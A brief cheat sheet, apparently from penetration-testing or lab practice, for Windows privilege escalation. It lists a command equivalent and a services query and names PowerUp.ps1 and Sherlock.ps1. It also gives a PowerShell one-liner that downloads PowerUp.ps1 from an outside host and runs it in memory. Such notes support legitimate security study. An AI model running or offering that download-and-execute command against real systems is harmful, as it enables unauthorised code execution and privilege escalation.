- `cat` = `type`

# Powershell

```
echo IEX ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.9:8000/PowerUp.ps1')) | powershell -noprofile -
```

# Services

- List all: `sc query state= all`

# Prev Escalation
- PowerUp.ps1
- Sherlock.ps1
